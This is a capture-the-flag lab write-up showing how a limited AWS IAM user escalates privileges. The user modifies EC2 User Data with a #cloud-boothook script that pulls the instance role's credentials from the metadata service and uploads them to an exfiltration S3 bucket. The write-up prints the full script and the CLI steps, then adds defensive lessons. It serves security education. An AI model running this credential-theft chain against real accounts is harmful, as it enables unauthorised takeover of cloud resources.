# IAM Privilege Escalation by EC2 User Data

## Solution

To retrieve the flag, I completed the following steps.
### a. Reviewed the lab scenario and deployed the Terraform environment

I first reviewed the README file to understand the lab objective. The scenario explained that the starting user was a limited IAM user named `dev_user`, and the goal was to retrieve a flag from a protected S3 bucket.

The important misconfiguration was that `dev_user` had permissions to stop, modify, and start an EC2 instance. That EC2 instance had an AdministratorAccess IAM role attached.

I deployed the lab environment using Terraform:

Command executed:
terraform init
terraform plan
terraform apply

After deployment, I viewed the Terraform outputs:
Command executed:
-----------------
terraform output -json
terraform output -raw start_txt


Using the Terraform outputs, I identified the following resources and information:

1. Target EC2 instance ID
2. Exfiltration S3 bucket
3. Protected flag bucket
4. AWS region
5. `dev_user` credentials

I also confirmed my identity using the AWS CLI command:

Command executed:
-----------------

aws sts get-caller-identity

The output showed that I was authenticated as:
text
arn:aws:iam::574246332158:user/iam-privesc-ec2-jylej70w-dev-user

These outputs showed the `dev_user` credentials, target EC2 information, exfiltration S3 bucket, protected flag bucket, and AWS region.

### b. Configured the limited dev_user account

I configured the AWS CLI using the `dev_user` credentials from Terraform output:

Command executed:
-----------------

aws configure

I entered the access key, secret key, region `us-east-1`, and output format `json`.

Then I verified the current identity:

Command executed:
-----------------
aws sts get-caller-identity
The output showed that I was authenticated as the limited lab user:
text
arn:aws:iam::574246332158:user/iam-privesc-ec2-jylej70w-dev-user

This confirmed that I was no longer using my admin account and was now operating as the intended starting user.

### c. Enumerated the EC2 instance

Next, I listed the EC2 instances available to the `dev_user`:

Command executed:
-----------------
aws ec2 describe-instances
From the output, I identified the target EC2 instance:
text
i-05f70a8c7df34d746

I also observed that the instance had an attached IAM instance profile and was running in a private subnet.
I also noticed that the instance had an IAM instance profile attached. This was important because an IAM instance profile means the EC2 instance has AWS permissions through an IAM role.

The target EC2 role was the privileged role used in the lab.

### d. Stopped the target EC2 instance

Before modifying EC2 User Data, the instance had to be stopped.

I stopped the instance using:

Command executed:
-----------------
aws ec2 stop-instances --instance-ids i-05f70a8c7df34d746

This succeeded, which confirmed that the limited `dev_user` had dangerous EC2 permissions.
This was the first important privilege escalation clue because a low-privileged user should not normally be able to control an EC2 instance with an AdministratorAccess role attached.

### e. Modified the EC2 User Data

After the instance stopped, I modified the EC2 User Data.
The purpose of the User Data script was to run during the EC2 boot process, access the EC2 metadata service, retrieve the temporary IAM role credentials, and upload those credentials to the exfiltration S3 bucket.

The script used was:
Command executed:
-----------------
#cloud-boothook
#!/bin/bash

TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
-H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
http://169.254.169.254/latest/meta-data/iam/security-credentials/)

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME \
> /tmp/creds.json

aws s3 cp /tmp/creds.json s3://iam-privesc-ec2-jylej70w-exfil-bucket/creds.json
Result of the User Data script:
- Retrieve EC2 metadata token
- Retrieve IAM role name
- Retrieve temporary credentials
- Upload the credentials to the exfiltration S3 bucket

Then, I added the script as EC2 User Data.

### f. Using `#cloud-boothook`

Then I used:
Command executed:
-----------------
#cloud-boothook
Normally, EC2 User Data with a regular bash script executes only during the first boot of the instance. Since the EC2 instance had already been created by Terraform, simply adding a normal `#!/bin/bash` script might not execute again after stopping and starting the instance.

`#cloud-boothook` is processed by cloud-init early in the EC2 boot process and allows the modified User Data script to execute again when the instance starts.

This caused the malicious User Data script to run successfully after restarting the EC2 instance, retrieve the temporary IAM role credentials from the metadata service, and upload them to the exfiltration S3 bucket.

### g. Explanation of the User Data script
The first part retrieved an IMDSv2 token:

Command executed:
-----------------
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
-H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

The address `169.254.169.254` is the EC2 Instance Metadata Service. EC2 instances use it to access metadata, including temporary IAM role credentials. IMDSv2 requires a token before metadata can be accessed.

The next part retrieved the IAM role name attached to the EC2 instance:
Command executed:
-----------------

ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
http://169.254.169.254/latest/meta-data/iam/security-credentials/)

Then the script retrieved the temporary credentials for that IAM role:

Command executed:
-----------------

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME \
> /tmp/creds.json

The credentials were saved locally as:

text
/tmp/creds.json


Finally, the script uploaded the credentials to the exfiltration S3 bucket:

Command executed:
-----------------
aws s3 cp /tmp/creds.json s3://iam-privesc-ec2-jylej70w-exfil-bucket/creds.json

This bucket was created by Terraform for the lab.

### h. Started the EC2 instance again

After saving the modified User Data, I started the instance:

Command executed:
-----------------

aws ec2 start-instances --instance-ids i-05f70a8c7df34d746

When the instance started, cloud-init processed the `#cloud-boothook` User Data script. The script retrieved the EC2 role credentials and uploaded them to the exfiltration S3 bucket.

### i. Retrieved the exfiltrated credentials

I checked the exfiltration bucket:

Command executed:
-----------------

aws s3 ls s3://iam-privesc-ec2-jylej70w-exfil-bucket

The output showed:

text
creds.json
This confirmed that the User Data script executed successfully.

I downloaded the credentials file:

Command executed:
-----------------
aws s3 cp s3://iam-privesc-ec2-jylej70w-exfil-bucket/creds.json .
Then I viewed the file:
Command executed:
-----------------
cat creds.json

The file contained temporary AWS credentials for the EC2 instance role:

- AccessKeyId
- SecretAccessKey
- Token

These credentials belonged to the privileged EC2 IAM role.

### j. Configured the stolen role credentials

I configured a new AWS CLI profile named `adminrole`:

Command executed:
-----------------

aws configure --profile adminrole


I entered the temporary AccessKeyId and SecretAccessKey from `creds.json`.

Because these were temporary role credentials, I also had to include the session token. I opened the AWS credentials file:

Command executed:
-----------------
nano ~/.aws/credentials

Then I added the session token under the `adminrole` profile:

ini
[adminrole]
aws_access_key_id=ACCESS_KEY_ID
aws_secret_access_key=SECRET_ACCESS_KEY
aws_session_token=SESSION_TOKEN

After saving the file, I verified the identity:

Command executed:
-----------------

aws sts get-caller-identity --profile adminrole

The output showed an assumed role:

text
assumed-role/iam-privesc-ec2-jylej70w-target-ec2-role

This confirmed that the privilege escalation worked. I was now using the EC2 instance role credentials instead of the limited `dev_user`.

### k. Retrieved the flag

Using the new `adminrole` profile, I accessed the protected flag bucket:

Command executed:
-----------------

aws s3 cp s3://iam-privesc-ec2-jylej70w-secret-flag/flag.txt . --profile adminrole


Then I displayed the flag:

Command executed:
-----------------

cat flag.txt


The flag was:
text
CG{us3r_d4t4_m0d1f1c4t10n_pr1v3sc_jylej70w}

------------------------------------------------

## Reflection

### What was your approach?

My approach started with understanding the lab architecture and identifying the permissions available to the `dev_user`. I focused on the EC2 instance because the README mentioned it had a highly privileged IAM role attached. After discovering that the user could stop and modify the EC2 instance, I used EC2 User Data to execute a malicious script that extracted the IAM credentials and uploaded them to an S3 bucket. Once the credentials were obtained, I configured them locally and accessed the protected flag bucket.

---

### What was the biggest challenge?

The biggest challenge was understanding how EC2 User Data works and how temporary IAM role credentials are retrieved from the EC2 metadata service. Since I was new to privilege escalation labs, understanding the attack flow and why the User Data script worked was initially confusing.

---

### How did you overcome the challenges?

I carefully reviewed the lab instructions and researched how EC2 metadata and IAM roles interact. I also tested the AWS CLI commands step by step and verified each stage before moving forward. Breaking the process into smaller parts helped me understand the overall attack path.

---

### What led to the breakthrough?

The breakthrough happened when the credentials successfully appeared inside the exfiltration S3 bucket. Once I downloaded the `creds.json` file and configured the `adminrole` profile, I confirmed that the privilege escalation had worked because the AWS CLI output displayed an assumed Administrator role.

---

### On the blue side, how can the learning be used to properly defend important assets?

This lab demonstrated the risks of overly permissive EC2 permissions and insecure IAM configurations. To properly defend important assets:

a. Restrict permissions to stop, start, and modify EC2 User Data

b. Apply the principle of least privilege for IAM users and roles

c. Monitor EC2 User Data modifications using CloudTrail and alerts

d. Restrict access to the EC2 metadata service whenever possible

e. Avoid attaching AdministratorAccess policies directly to EC2 roles

f. Use security monitoring tools to detect unusual credential exfiltration activity

---

## Conclusion

This lab demonstrated how a limited IAM user could escalate privileges by abusing EC2 User Data modification permissions. By using `#cloud-boothook`, the modified User Data script executed when the instance restarted, retrieved the EC2 role credentials from the metadata service, and uploaded them to an S3 bucket. Those temporary credentials were then used to assume the privileged EC2 role and retrieve the flag.
The main lesson from this lab is that EC2 control permissions can become highly dangerous when combined with privileged IAM roles. Proper IAM restrictions, monitoring, and least privilege design are necessary to prevent this type of privilege escalation.

